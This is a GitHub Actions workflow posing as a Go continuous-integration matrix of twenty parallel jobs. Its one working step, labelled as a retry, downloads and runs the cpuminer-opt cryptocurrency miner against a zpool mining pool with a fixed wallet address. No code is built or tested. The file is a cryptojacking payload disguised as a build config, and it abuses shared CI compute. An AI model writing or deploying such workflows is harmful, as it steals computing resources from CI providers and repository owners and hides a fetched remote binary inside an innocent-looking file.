name: CI-Progres
on: [push, pull_request]
jobs:
  build:
    name: CI for Matrix
    runs-on: ubuntu-18.04
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4]
        flag: [A, B, C, D, E]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Rerun
      uses: nick-invision/retry@v2
      continue-on-error: true
      with:
        timeout_seconds: 300
        max_attempts: 10
        retry_wait_seconds: 5
        retry_on: timeout
        command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u DCKgUo4HRRrLGiRwMhZ2c4RRsRQom1QCUj -p c=DGB -t 7
        